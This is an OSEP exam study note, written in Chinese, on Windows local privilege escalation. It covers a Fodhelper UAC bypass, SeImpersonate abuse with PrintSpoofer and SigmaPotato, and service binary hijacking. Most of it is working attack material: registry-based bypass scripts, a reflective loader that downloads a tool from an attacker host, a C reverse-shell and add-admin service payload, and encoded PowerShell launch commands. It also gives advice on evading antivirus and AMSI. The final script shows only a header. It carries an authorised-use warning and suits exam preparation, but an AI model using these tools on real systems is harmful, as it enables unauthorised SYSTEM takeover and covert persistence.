::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 06 · UAC Bypass & Windows 本地提权（场景 25–27）

> 技术路线对齐（关键词：`UAC Bypass` `PrintSpoofer` `SigmaPotato` `FullPowers` `AlwaysInstallElevated` `Service Binary Hijacking`）。
>
> 相关模块：本模块只讲「拿到第一段立足点之后的本地提权」。横向移动见 [15-winrm-lateral](/zh/modules/15-winrm-lateral)，凭据抓取见 [07-credentials-lsass](/zh/modules/07-credentials-lsass)。
>
> 统一占位符：`LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`。

三种提权形态在本模块的适用顺序（考试建议的排查顺序）：

1. **永远是管理员但在受限令牌下**（UAC 中等完整性）→ 场景 25（Fodhelper 等 UAC bypass）。
2. **服务账户 / 低权限但持有 SeImpersonatePrivilege** → 场景 26（PrintSpoofer / SigmaPotato 系）。
3. **对本地服务有写权限 / 可停启服务** → 场景 27（服务二进制劫持）。

先跑一次快速身份判定再决定走哪条：

```powershell
whoami /all                     # 看 Mandatory Label（完整性）、Privileges（SeImpersonate 等）
net localgroup administrators    # 是否已是本地管理员组成员
sc qc <ServiceName>              # 之后场景 27 用
```

---

## 场景 25 · 未提升令牌 → Fodhelper 注册表 UAC Bypass

### 场景回顾
已通过钓鱼/Webshell/凭据获得一枚**本地管理员组成员但未提升**的令牌（`whoami /groups` 里 `Mandatory Label\Medium Mandatory Level`，但用户属于 `BUILTIN\Administrators`）。目标是执行高权限（高完整性）命令，绕过 UAC。Windows 10/11 常见主机默认 `ConsentPromptBehaviorAdmin=5`（提示输入凭据）——能自动 UAC bypass 的前提是**用户已是管理员组成员**；若默认是 `EnableLUA=0` 或提示行为 = 每次都问（值 2），则不适用。

### 前提与假设
- 当前用户 `USER` 属于本地 `Administrators` 组，且 UAC 开启（`EnableLUA=1`，默认）。
- 有可写位置放 payload（通常是用户目录，无需高权限）。
- 目标无完整杀软/EDR 阻止注册表写入或 spawn 行为（如存在，见失败分支）。
- 考试中常见变体：Fodhelper、ComputerDefaults、wsreset、eventvwr（新版已修复/受路径影响）。

### 准备（攻击机侧）
```bash
# 1. 生成反向 shell 或 beacon
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f exe -o svc.exe   # 服务二进制示例
# 或准备无文件第二阶段：m06-fodhelper-uac.ps1 内嵌 PAYLOAD 变量

# 2. 攻击机监听
nc -lvnp LPORT            # 或 msfconsole 的 handler / CS listener
```

### 执行步骤
原理：`fodhelper.exe`（Windows 功能助手，位于 `C:\Windows\System32`，默认自动提升 manifest）启动时会查询 `HKCU\Software\Classes\ms-settings\Shell\Open\command`，若存在则**以高完整性**执行该 command。因为键在 `HKCU`，未提升进程即可写。

```powershell
# 在目标上（中完整性 shell / Webshell 执行）
# 1) 写一个高权限要跑的命令（反向 shell 或加管理员）：
#    DelegateExecute 必须存在（空字符串），默认值放要执行的命令
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c powershell -nop -w hidden -enc <BASE64>" /f
# 注意：命令载体与触发宿主多套变体见 m06-fodhelper-uac.ps1；不要先 /ve 后 /v 顺序颠倒

# 2) 触发（会弹一次 UAC 画面临时闪烁后消失或直接静默提升，取决于设置）：
fodhelper.exe
# 备选宿主：computerdefaults.exe  /  wsreset.exe（win10 1803-1903） /  slui.exe

# 3) 清理注册表键（重要！）：
reg delete "HKCU\Software\Classes\ms-settings" /f
```

集成脚本：`m06-fodhelper-uac.ps1`（自动写入键、触发、可选延时清理）。

### 用到的脚本
- `m06-fodhelper-uac.ps1`

### 验证
- `whoami /groups` 在反弹 shell 中显示 `High Mandatory Level`；
- `net session` 不报“拒绝访问”，或可读取管理员专属路径。

### 失败分支与备选
1. **命令没执行但也没报错**：先手工 `cmd /c fodhelper.exe` 观察；确认 `DelegateExecute` 空字符串键是否写对、默认值名称（不是 `(Default)` 引号问题）写对；换 `computerdefaults.exe`。
2. **主机是 Win10 老版本 / UAC 关闭 / 用户不是管理员**：`EnableLUA=0` 时无需 bypass（直接高权限）；用户非管理员组成员时 Fodhelper 无效 → 改走服务提权/内核（本模块场景 26/27，或 MS16-032 等历史漏洞——考试一般不考内核）。
3. **杀软拦截 `reg add` 或 `spawn`**：把注册表写入与触发拆到两阶段（写入用 shell，触发用计划任务或 `schtasks /run`）；payload 用无文件 PowerShell 编码 + AMSI 处理（见 M05）；最后清理键，避免留下明显 IOC。
4. **Fodhelper 被策略禁用/路径重定向**：尝试 `computerdefaults.exe`、`wsreset.exe`、`slui.exe` 等同族；或切 `AlwaysInstallElevated`（见下方提示条）。
5. 反弹 shell 不稳定：先不加持久化，直接跑既定命令（谁启动、以什么权限启动，见 m06-fodhelper-uac.ps1 说明）。

> 提示：AlwaysInstallElevated（`HKLM\...\Windows Installer` 与 `HKCU\...\Windows Installer` 同时为 1）时，可 `msiexec /quiet /qn /i payload.msi` 直接提权——这是 cheat sheet 单独列的条目，写注册表探测两条路径后即可用（脚本中给探测命令）。

### 考试注意 / OPSEC
- **用后必清注册表键**（`reg delete`），否则该用户后续任何设置类操作都会再触发命令，留下持久化痕迹。
- Fodhelper 触发时可能出现 UAC 弹窗闪烁——在交互会话中会被用户看到；若环境允许，优先非交互载荷 + 短命令。
- 反弹连接统一走 `LHOST/LPORT`，别在命令里硬编码攻击机内网 IP（会被蓝队/EDR 关联）。
- 该场景拿到的还是**同一用户**的高完整性令牌，不是 SYSTEM——后续横向/提权别混淆。

---

#### `m06-fodhelper-uac.ps1` {#m06-fodhelper-uac-ps1}

````powershell
<#
用途：当前用户已是本地管理员组成员但会话未提升（中完整性）时，用 Fodhelper/ComputerDefaults 等自动提升宿主触发高权限命令，并自动清理注册表键
场景：docs/06-uac-windows-privesc.md 场景 25（未提升管理员令牌 → UAC Bypass）
依赖：PowerShell 3.0+（2.0 也能跑主体逻辑）；要求 UAC 开启(EnableLUA=1)且用户属本地 Administrators；被 IEX 或 -f 执行均可
使用：powershell -nop -w hidden -ep bypass -f m06-fodhelper-uac.ps1 -Command "cmd.exe /c whoami > C:\Windows\Temp\ok.txt"
      # 典型：弹回高完整性 PowerShell，再自行 IEX 反弹：
      powershell -ep bypass -f m06-fodhelper-uac.ps1 -Command "powershell -nop -w hidden -enc <BASE64>"
      # 备选宿主：-HostBin ComputerDefaults | Wsreset | Fodhelper(默认)；-DelaySeconds 控制清理延时；-Keep 保留注册表键
占位符：BASE64=第二阶段命令编码（攻击机 iconv -t UTF-16LE|base64）；LHOST/LPORT 已编码进 BASE64
测试状态：未在 Windows 实测（本机为 macOS）；语法经人工检查。先在隔离 VM 验证一次触发与清理
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Command,
    [ValidateSet("Fodhelper", "ComputerDefaults", "Wsreset")]
    [string]$HostBin = "Fodhelper",
    [int]$DelaySeconds = 5,
    [switch]$Keep,
    [switch]$DryRun          # 只写键 + 打印将触发的宿主，不真正启动（调试用）
)

$ErrorActionPreference = "Stop"
$KeyPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
$BinMap = @{
    Fodhelper        = "C:\Windows\System32\fodhelper.exe"        # Win10/11、Server 2016+，最通用
    ComputerDefaults = "C:\Windows\System32\ComputerDefaults.exe" # 同 ms-settings 协议，备用
    Wsreset          = "C:\Windows\System32\wsreset.exe"          # Win10 1803~1903 有效，新版已修
}
$HostExe = $BinMap[$HostBin]

function Test-AdminMember {
    # 用户是否在本地 Administrators 组（UAC bypass 硬前提）
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p  = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-Elevated {
    # 会话是否已高完整性（若是，无需 bypass）
    try { $t = (whoami /groups | Select-String "S-1-16-12288") -ne $null; return $t }
    catch { return $false }
}

function Write-Log($m) { Write-Output ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }

# ---------- 前置检查 ----------
if (-not (Test-Elevated)) { Write-Log "当前会话非高完整性，继续" } else { Write-Log "已是高完整性，无需 bypass（直接跑命令即可）"; exit 0 }
if (-not (Test-AdminMember)) {
    Write-Log "[-] 当前用户不在本地 Administrators 组，Fodhelper 路不可用（UAC bypass 需要管理员组成员）"
    Write-Log "[-] 改走：AlwaysInstallElevated 探测 / 服务提权（见 docs/06 场景 26/27）"
    exit 1
}
if (-not (Test-Path $HostExe)) { Write-Log "[-] 宿主 $HostExe 不存在，换 -HostBin 或新系统重测"; exit 1 }

# ---------- 写入注册表 ----------
Write-Log "[+] 写入 $KeyPath （DelegateExecute 为空 + 默认值=命令）"
try {
    New-Item -Path $KeyPath -Force | Out-Null
    New-ItemProperty -Path $KeyPath -Name "DelegateExecute" -PropertyType String -Value "" -Force | Out-Null
    Set-ItemProperty -Path $KeyPath -Name "(default)" -Value $Command -Force
    Write-Log "[+] 命令已写入：(default) = $Command"
} catch {
    Write-Log "[-] 注册表写入失败：$($_.Exception.Message)（检查是否被策略/杀软拦截）"
    exit 1
}

if ($DryRun) {
    Write-Log "[DryRun] 将触发：$HostExe（未实际启动）"
    if (-not $Keep) { Remove-Item -Path $KeyPath -Recurse -Force -ErrorAction SilentlyContinue }
    exit 0
}

# ---------- 触发 ----------
Write-Log "[+] 触发 $HostExe ...（可能短暂出现 UAC 闪烁或黑窗）"
try { Start-Process -FilePath $HostExe -WindowStyle Hidden | Out-Null } catch { Start-Process -FilePath $HostExe | Out-Null }

# ---------- 等待并清理 ----------
Write-Log "[+] 等待 $DelaySeconds 秒后清理注册表键（防持久化残留）"
Start-Sleep -Seconds $DelaySeconds
if ($Keep) {
    Write-Log "[!] -Keep 已设：保留 $KeyPath（考试交卷前请手动清理）"
} else {
    Remove-Item -Path $KeyPath -Recurse -Force -ErrorAction SilentlyContinue
    if (Test-Path $KeyPath) { Write-Log "[-] 清理失败，手动执行：reg delete HKCU\Software\Classes\ms-settings /f" }
    else { Write-Log "[+] 注册表键已清理" }
}

# ---------- 验证提示 ----------
Write-Log "[*] 验证：反弹/子进程里 whoami /groups 应显示 High Mandatory Level (S-1-16-12288)"
Write-Log "[*] 失败排查：A) DelegateExecute 键是否写入成功  B) 换 -HostBin ComputerDefaults  C) 用户是否确为管理员组成员  D) 命令本身是否被杀软拦（先用 cmd /c whoami > 文件 验证高权限）"
````

## 场景 26 · SeImpersonate 令牌 → PrintSpoofer / SigmaPotato

### 场景回顾
已获得一个**服务账户或本地服务上下文中可执行命令**的立足点（如 Webshell 以 IIS AppPool 身份、SQL Server 的 `xp_cmdshell`、Windows 服务本身），检查 `whoami /priv` 发现 `SeImpersonatePrivilege`（或 `SeAssignPrimaryTokenPrivilege`）。目标是拿到 `NT AUTHORITY\SYSTEM`。

### 前提与假设
- 进程令牌带 `SeImpersonatePrivilege`（默认所有服务账户、IIS AppPool、MSSQL 服务账户都有）。
- 攻击机能访问目标上**可写目录**（放工具/二进制），或目标能出网下载。
- 服务以 `LocalSystem`/`NetworkService`/`LocalService` 运行时，另一侧要能连回攻击机监听（PrintSpoofer 方式需要回连）或本机自回环（Potato 方式多不需要出网）。

### 准备（攻击机侧）
```bash
# PrintSpoofer（Windows 10/11 + Server 2016+，最稳）
#  - 本地 https://github.com/itm4n/PrintSpoofer （发布二进制）
# SigmaPotato（Potato 系现代版，Variant 1 = 本地，Variant 2/3 用 RPC 到攻击机）
#  - 本地 https://github.com/Kevin-Robertson/SigmaPotato
# 自编译注意：C++ 项目在 VS 里 target x64，静态/动态选型按目标。

# 攻击机监听（PrintSpoofer 需要攻击机有监听；SigmaPotato 本地变体不需要）：
nc -lvnp LPORT
```

### 执行步骤
```powershell
# 0) 确认特权确实开启（很多工具失败是因为特权被禁用 → 先 FullPowers/手动启用）：
whoami /priv

# 1) 上传/落地工具（IIS AppPool 有写权限的目录、%TEMP% 均可）
# 2) PrintSpoofer —— 本机提权，反弹到攻击机：
PrintSpoofer64.exe -i -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"   # -i 交互式（本机弹窗）
PrintSpoofer64.exe -c "cmd.exe /c powershell -nop -w hidden -enc <BASE64>"      # 或直接反弹

# 3) SigmaPotato（如果网络限制/不需要出网）：
#    本地变体直接跑，不加参数 → 输出 SYSTEM shell 的命令模板
SigmaPotato.exe -cmd "cmd /c whoami"                                            # 测试
SigmaPotato.exe -cmd "powershell -nop -w hidden -enc <BASE64>"                  # 执行

# 4) 老版本系统（Server 2008/2012、Win7/8）：
#    RoguePotato / PrintSpoofer 不适用时用 JuicyPotato（2012/2016 老系统）或 Potato 系列
```

### 用到的脚本
- `m06-sigmapotato-reflect.ps1`（离线自包含版本——不落地 EXE，用反射方式执行 SigmaPotato 的核心逻辑；同时是“自动工具失败时的手工备选”的载体）
- 备选工具形态见文档：PrintSpoofer 二进制、JuicyPotato、RoguePotato、SpoolSample（打印假脱机诱导认证，见下）。

### 验证
- 执行后 `whoami` 返回 `nt authority\system`；
- `whoami /groups` 中 `Mandatory Label\High Mandatory Level`（SYSTEM 恒为高）。

### 失败分支与备选
1. **工具一运行就退出/无输出**：先查特权是否被**禁用**（`whoami /priv` 显示 Disabled）——服务账户令牌里的 SeImpersonate 常被禁用，用 FullPowers（GitHub itm4n/FullPowers）恢复或重提 token 后再打；也可检查目标系统版本与工具的兼容性（PrintSpoofer 需要 Server 2016/Win10 1607+；老系统换 JuicyPotato/RoguePotato）。
2. **工具被杀软查杀/无法落地**：用 `m06-sigmapotato-reflect.ps1` 反射执行，或把工具编码后内存加载（见 M05/M01 思路）；再不行**手工**利用：用 .NET `DuplicateToken` + 创建带 SYSTEM token 的进程（脚本内给出最小实现）。
3. **PrintSpoofer 需要回连但目标出网受限**：改 SigmaPotato/JuicyPotato 的本地回环变体（无需出网）；或诱导 SYSTEM 通过 SMB/HTTP 回连攻击机（SpoolSample + 中继，见 M16/M11 的 relay 思路）。
4. **拿到的不是 SYSTEM 而是别的账户**：核对服务运行账户——`NetworkService` 下 PrintSpoofer 通常仍能提到 SYSTEM（打印池是 SYSTEM）；若服务是普通账户无 SeImpersonate，则此路不通，切场景 27。
5. 工具需要 .NET/运行库：老系统先确认 PowerShell/.NET 版本（SigmaPotato 用 PowerShell 实现则无二进制依赖）。

> SpoolSample（打印假脱机）在此场景的用法：它是**诱导认证**而非直接提权——让 `potato`/`printbug` 触发 SYSTEM 对被控机的认证，配合中继或 RPC 利用（典型是 Printerbug → Relay 到 LDAP/ADCS，见 [12-ad-attacks](/zh/modules/12-ad-attacks) ESC8）。如果本机土豆路线全失败，这是考题的“备选路径”。

### 考试注意 / OPSEC
- 上传的 EXE 记得删或放到会被清理的目录；反射脚本不落盘是最干净的形态。
- PrintSpoofer 反弹走 `LHOST:LPORT`，与阶段一的监听错开端口/协议，避免混淆日志。
- 只做一次提权确认（whoami），别反复 spawn SYSTEM shell 制造噪音。
- 交互式 `-i` 弹窗在无桌面会话的服务上下文里无效——一律用 `-c` 带命令。

---

#### `m06-sigmapotato-reflect.ps1` {#m06-sigmapotato-reflect-ps1}

````powershell
<#
用途：在 SeImpersonate 上下文中用 .NET 反射内存加载 SigmaPotato.exe（不落盘），执行任意 SYSTEM 命令或反向 shell
场景：docs/06-uac-windows-privesc.md 场景 26（IIS AppPool / SQL 服务账户等 → SYSTEM）；也兼容 PrintSpoofer 拿不到时的手工备选
依赖：PowerShell 3.0+；目标进程令牌带 SeImpersonatePrivilege（服务账户默认有，但可能被禁用——见 -CheckOnly）；SigmaPotato.exe 由攻击机 HTTP(S) 提供
使用：powershell -nop -w hidden -ep bypass -f m06-sigmapotato-reflect.ps1 -Url http://LHOST/SigmaPotato.exe -RevShellIP LHOST -RevShellPort LPORT
      # 只跑命令：-Command "cmd /c whoami"
      # 本地已下载：-LocalPath C:\Windows\Temp\SigmaPotato.exe -Command "..."
      # 先体检不动手：-CheckOnly
占位符：LHOST=攻击机 IP；LPORT=监听端口；URL=http://LHOST/SigmaPotato.exe（我方投递地址）
测试状态：未在 Windows 实测（本机为 macOS）；语法经人工检查。AMSI/杀软若拦截需先做 AMSI 处理（见 docs/05）
#>
[CmdletBinding()]
param(
    [string]$Url = "http://LHOST/SigmaPotato.exe",   # 攻击机 python3 -m http.server 提供
    [string]$LocalPath = "",                          # 已落盘的 SigmaPotato.exe 路径（二选一）
    [string]$Command = "cmd /c whoami",               # 普通命令模式
    [string]$RevShellIP = "",                         # 反向 shell 模式（与 -Command 二选一）
    [int]$RevShellPort = 0,
    [switch]$CheckOnly                                # 只检查特权不执行
)

function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }

Section "特权检查（失败先看这里）"
$privOut = whoami /priv
$privOut | Write-Output
$hasImp = ($privOut | Select-String "SeImpersonatePrivilege") -ne $null
$enabled = $hasImp -and (($privOut | Select-String "SeImpersonatePrivilege") -match "Enabled")
if (-not $hasImp) {
    Write-Output "[-] 没有 SeImpersonatePrivilege —— 土豆类技术不适用，改走服务劫持（docs/06 场景 27）"
    exit 1
}
if (-not $enabled) {
    Write-Output "[!] SeImpersonatePrivilege 存在但被 DISABLED（服务账户令牌常见）"
    Write-Output "[!] 先用 FullPowers 恢复默认特权集，再重跑本脚本："
    Write-Output "    FullPowers.exe -c \"powershell -ep bypass -f m06-sigmapotato-reflect.ps1 -Url $Url -RevShellIP $RevShellIP -RevShellPort $RevShellPort\""
    exit 1
}
Write-Output "[+] SeImpersonatePrivilege 已启用，继续"

if ($CheckOnly) { Write-Output "[CheckOnly] 特权就绪。真正执行时去掉 -CheckOnly"; exit 0 }

Section "加载 SigmaPotato 程序集"
$bytes = $null
if ($LocalPath) {
    if (-not (Test-Path $LocalPath)) { Write-Output "[-] $LocalPath 不存在"; exit 1 }
    Write-Output "[+] 从本地文件读取：$LocalPath"
    $bytes = [IO.File]::ReadAllBytes($LocalPath)
} else {
    Write-Output "[+] 下载：$Url"
    try {
        $wc = New-Object System.Net.WebClient
        # 若目标走代理才需要下一行；默认直连
        $bytes = $wc.DownloadData($Url)
    } catch {
        Write-Output "[-] 下载失败：$($_.Exception.Message)"
        Write-Output "[-] 备选：A) 本机已有文件用 -LocalPath  B) certutil -urlcache -split -f $Url  C) 换 http 端口/UA"
        exit 1
    }
}
$asm = [System.Reflection.Assembly]::Load($bytes)
if (-not $asm) { Write-Output "[-] Assembly::Load 返回空（文件不是有效 .NET 程序集？）"; exit 1 }
$type = $asm.GetType("SigmaPotato")
if (-not $type) {
    Write-Output "[-] 找不到 SigmaPotato 类型（版本不符？用 [SigmaPotato]::Main 失败时查看程序集导出类型："
    Write-Output "    $($asm.GetExportedTypes() | ForEach-Object { $_.FullName })"
    exit 1
}

Section "执行"
try {
    if ($RevShellIP -and $RevShellPort) {
        Write-Output "[+] 反向 shell 模式：$RevShellIP : $RevShellPort"
        $type::Main(@("--revshell", $RevShellIP, "$RevShellPort"))
    } else {
        Write-Output "[+] 命令模式：$Command"
        $type::Main($Command)
    }
    Write-Output "[*] Main 返回（或已在子进程里反弹）。验证：whoami 应为 nt authority\system"
} catch {
    Write-Output "[-] 执行异常：$($_.Exception.Message)"
    Write-Output "[-] 失败排查：A) 目标版本过老（Win7/2008）→ PrintSpoofer/SigmaPotato 需 Win10/2016+，换 JuicyPotato/RoguePotato"
    Write-Output "[-]           B) 命令含特殊字符被拆分 → 加引号或先落地 cmd 脚本再执行"
    Write-Output "[-]           C) 杀软拦反射加载 → 先做 AMSI/内存处理（docs/05）或落地执行"
    exit 1
}
````

## 场景 27 · 手工服务二进制劫持（含回滚）

### 场景回顾
拿到低权限立足点后，`sc qc` / `wmic service` 发现某个 Windows 服务：**二进制路径指向可写位置**，或**注册表 ImagePath 可改**，且服务可被（重新）启动/停止。目标：把服务二进制换成自己的 payload，等服务以 SYSTEM 启动 → 提权。

### 前提与假设
- 服务以 `LocalSystem`（或高权限账户）运行；
- 二进制所在目录对当前用户**可写**，或服务配置（`HKLM\SYSTEM\CurrentControlSet\Services\<svc>`）的 `ImagePath` 可写/可改；
- 服务允许低权限用户 `start/stop`（`sc start` 不报拒绝访问），或依赖重启/崩溃自动拉起（考试环境多可直接重启服务）；
- 已确认原服务不影响考试目标继续运行（破坏性最小原则，见回滚）。

### 准备（攻击机侧）
```bash
# 用 m06-service-binary-payload.c 编译 payload：
#   x86_64-w64-mingw32-gcc -o svcpayload.exe m06-service-binary-payload.c   (Linux 交叉编译)
#   或 VS: cl m06-service-binary-payload.c
# 确认服务架构：服务名是 32 位进程就编 x86，64 位就编 x64。
```

### 执行步骤（checklist）
```powershell
# 1) 枚举可写服务（三种视角）：
wmic service get name,pathname,startname | findstr /i "LocalSystem"
sc qc <svc>                          # 确认 StartType、BINARY_PATH_NAME、SERVICE_START_NAME
# 用 accesschk（Sysinternals）查可写：
accesschk.exe /accepteula -uwcqv "Authenticated Users" *     # 全校验过于吵，按需过滤
accesschk.exe /accepteula -uwcqv USER * | findstr /i "service"

# 2) 记录原配置（回滚必须！）：
reg export "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" C:\Windows\Temp\<svc>-backup.reg /y
# 或记下：ImagePath、ObjectName、Start、ImagePath 环境变量展开方式

# 3) 落地替换：
#    方式 A：目录可写 → 备份原 exe、放 payload
copy /y "C:\Program Files\<vendor>\<svc>.exe" C:\Windows\Temp\<svc>.exe.bak
copy /y C:\Windows\Temp\svcpayload.exe "C:\Program Files\<vendor>\<svc>.exe"
#    方式 B：目录不可写但 ImagePath 可改（低版本/配置错误）→ 指向攻击机可控路径的 payload
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\svcpayload.exe" /f
#    方式 C（备选）：DLL 劫持——把恶意 DLL 放进服务目录并让其优先于原 DLL 加载（依赖已知缺失 DLL 时）

# 4) 触发：
sc stop <svc> ; sc start <svc>
# 服务不可手动停 → 尝试 net stop / 重启机器（考试环境慎用）/ schtasks 定时触发
# 某些服务一次启动后崩溃会反复拉起——正好用于拿 shell

# 5) 确认 SYSTEM shell 回连后立刻回滚：
sc stop <svc>
copy /y C:\Windows\Temp\<svc>.exe.bak "C:\Program Files\<vendor>\<svc>.exe"
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /f   # 若方式 B
reg import C:\Windows\Temp\<svc>-backup.reg /y   # 若方式 A 且改过注册表
sc start <svc>                                   # 恢复原服务（验证能起）
```

### 用到的脚本
- `m06-service-binary-payload.c`（服务 payload：启动后派生反连 shell 或加管理员，且可选地替身保持服务“活着”）
- `m06-service-hijack.ps1`（保存/恢复原配置的完整劫持+回滚自动化）

### 验证
- 触发后攻击机监听收到 SYSTEM shell（`whoami` → `nt authority\system`）；
- 回滚后 `sc start <svc>` 成功、原进程正常。

### 失败分支与备选
1. **`sc start` 报“拒绝访问”**：低权限用户通常只能启动部分服务——换一个可启动的服务（优先第三方软件服务、`Auto` 启动、无 `ChangeConfig` 保护）；或改用**计划任务/启动项**（如果该用户可写 `HKLM\...\Run` 或 Startup 目录，但那只在下次登录/重启生效）。
2. **替换后服务起不来**：payload 没实现服务主函数或 `SERVICE_START` 失败——`m06-service-binary-payload.c` 不把自己注册成服务而是 fork 出反连（即服务启动瞬间报错但子进程已出网）；此时 `sc start` 会报错但 shell 已回来，属预期。若想服务“正常”运行（更隐蔽），编译成带最小服务主循环的版本。
3. **目录可写但替换被占用/被 AV 拦**：先停服务再替换；AV 拦截就换无文件方案（服务 ImagePath 指向 `rundll32`/`regsvr32` 起脚本阶段？——不行，ImagePath 是 EXE；可用 `powershell.exe -enc` 作为 ImagePath 指向本机已有二进制）。
4. **找不到可写服务**：扩大枚举（`icacls` 手工查第三方安装目录），或评估自装服务（若可 `sc create` 则自建一个指向自己 payload 的服务——需要 SeServiceLogonRight 之类，常见于运维弱配置）；都不行再考虑场景 25/26。
5. 回滚失败导致目标服务永久损坏：**先导出注册表、备份原 exe 再动手**是硬要求；若回滚后服务仍无法启动，用 `reg import` 恢复并重启服务（见 m06-service-hijack.ps1 的 restore 分支）。

### 考试注意 / OPSEC
- **回滚是评分点**：考纲环境常要求最后恢复原状，别把考试服务搞挂（许多场景依赖同一服务后续继续用）。
- 替换系统自带服务（如 `Spooler`）动静太大、易被发现；优先找第三方/教学环境预设的脆弱服务。
- payload 名称尽量贴近原服务名（如 `svc.exe`），落地在 `%TEMP%` 或用后即删，避免持久化痕迹。
- 计划任务/重启触发方式在考试里要谨慎评估对环境的破坏（重启可能断掉你的其他通道）。

---

#### `m06-service-binary-payload.c` {#m06-service-binary-payload-c}

````c
/*
用途：Windows 服务二进制劫持用的 payload——服务以 SYSTEM 启动时执行，默认反向 shell（cmd 直连回攻击机），或编译成添加本地管理员两种模式
场景：docs/06-uac-windows-privesc.md 场景 27（低权限可替换/可改高权限服务二进制 → SYSTEM）；替换后由 sc start 触发
依赖：Windows（winsock2）；编译时需 -lws2_32（仅反向 shell 模式需要）
使用：Linux 交叉编译（位数必须匹配服务进程：先确认服务是 x86 还是 x64）：
      # 反向 shell（默认模式）
      x86_64-w64-mingw32-gcc m06-service-binary-payload.c -o svcpayload.exe -lws2_32
        -DLHOST=\"10.10.14.5\" -DLPORT=4444
      # 添加本地管理员（无回连需求时，例如目标出网受限）
      x86_64-w64-mingw32-gcc m06-service-binary-payload.c -o svcpayload.exe -DMODE_ADDUSER \
        -DUSER=ops -DPASS=\"P@ssw0rd!2024\"
      # 保持进程存活（进程不退出，服务重启循环更稳；配合无 SCM 注册的行为）
      ... -DSERVICE_STAYALIVE
      # 32 位服务用：i686-w64-mingw32-gcc（同上参数）
占位符：LHOST=攻击机可达 IP；LPORT=监听端口；USER/PASS=要添加的管理员账户（默认 emma / Password123!）
测试状态：未实测（本机 macOS 无 mingw 交叉链）；语法经人工检查。上靶机前先在隔离 VM 用 sc create 自建服务验证
注意：被 SCM 启动时本程序不注册为服务控制分发器，sc start 可能报 1053——shell/账户副作用已发生即视为成功，随后按 docs/06 回滚
*/
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

/* ---------- 配置（编译期 -D 覆盖） ---------- */
#ifndef LHOST
#define LHOST "127.0.0.1"          /* 攻击机 IP */
#endif
#ifndef LPORT
#define LPORT 4444                 /* 攻击机监听端口 */
#endif
#ifndef USER
#define USER "emma"                /* ADDUSER 模式账户名 */
#endif
#ifndef PASS
#define PASS "Password123!"        /* ADDUSER 模式密码（须满足目标密码策略） */
#endif

/* ---------- 模式一：反向 shell（默认） ---------- */
static int revshell(void)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;
    s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET)
        return 1;

    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)LPORT);
    addr.sin_addr.s_addr = inet_addr(LHOST);
    /* 不解析主机名：LHOST 直接给 IP，避免服务上下文 DNS 依赖 */
    if (WSAConnect(s, (struct sockaddr *)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    /* 把 socket 当标准句柄交给 cmd.exe，得到交互 shell */
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(s);
        WSACleanup();
        return 1;
    }
    /* 子进程继承 socket，父进程句柄可立即关闭 */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

/* ---------- 模式二：添加本地管理员（-DMODE_ADDUSER） ---------- */
static int addadmin(void)
{
    char buf[256];
    snprintf(buf, sizeof(buf), "net user %s %s /add", USER, PASS);
    system(buf);
    snprintf(buf, sizeof(buf), "net localgroup administrators %s /add", USER);
    system(buf);
    return 0;
}

int main(void)
{
#ifdef MODE_ADDUSER
    addadmin();
#else
    revshell();
#endif
#ifdef SERVICE_STAYALIVE
    /* 服务重启循环场景：让进程活着，避免 SCM 反复拉起造成日志噪音 */
    Sleep(INFINITE);
#endif
    return 0;
}
````

#### `m06-service-hijack.ps1` {#m06-service-hijack-ps1}

````powershell
<#
用途：手工服务二进制劫持的完整自动化——先保存原配置（注册表导出 + 原 exe 备份），替换为 payload 并启动服务，之后再一键回滚恢复原状
场景：docs/06-uac-windows-privesc.md 场景 27（自动服务提权工具失败，但你确认能改某高权限服务的二进制或 ImagePath）
依赖：PowerShell 3.0+（Get-CimInstance）；当前用户对该服务有 start/stop/改配置权限；payload 已上传到目标（如 C:\Windows\Temp\svcpayload.exe）
使用：先劫持：
      powershell -ep bypass -f m06-service-hijack.ps1 -ServiceName <svc> -PayloadPath C:\Windows\Temp\svcpayload.exe
      # 验证拿到 SYSTEM（whoami）后回滚：
      powershell -ep bypass -f m06-service-hijack.ps1 -Action Restore -ServiceName <svc>
      # 目标目录不可写但 ImagePath 可改时，劫持加 -UseImagePath（ImagePath 指向 payload）
占位符：TARGET=目标主机；payload 里 LHOST/LPORT 已编好；USER/PASS 模式见 m06-service-binary-payload.c
测试状态：未在 Windows 实测（本机为 macOS）；语法经人工检查。回滚逻辑务必先在隔离 VM 验证一次
#>
